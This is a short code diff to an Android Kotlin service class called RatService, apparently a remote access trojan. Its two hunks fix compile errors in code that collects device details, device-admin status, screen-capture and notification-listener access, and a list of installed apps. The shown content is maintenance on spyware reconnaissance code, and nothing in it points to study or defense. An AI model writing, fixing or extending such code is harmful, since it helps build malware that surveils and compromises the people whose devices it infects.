@@ -862,7 +862,7 @@ class RatService : Service() {
         append("Model: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n')
         append("Android ").append(Build.VERSION.RELEASE)
         append(" (API ").append(Build.VERSION.SDK_INT).append(")\n")
-        append("Admin: ").append(adminActive(this)).append('\n')
+        append("Admin: ").append(adminActive(this@RatService)).append('\n')
         append("Screen: ").append(Scr.instance != null).append('\n')
         append("Notif: ").append(Settings.Secure.getString(
             contentResolver, "enabled_notification_listeners")?.contains(packageName)).append('\n')
@@ -943,7 +943,7 @@ class RatService : Service() {
         val sb = StringBuilder()
         try {
             for (pi in packageManager.getInstalledPackages(0).take(200)) {
-                sb.append(packageManager.getApplicationLabel(pi)).append(" — ")
+                sb.append(packageManager.getApplicationLabel(pi.applicationInfo)).append(" — ")
                     .append(pi.packageName).append('\n')
             }
         } catch (_: Exception) { }
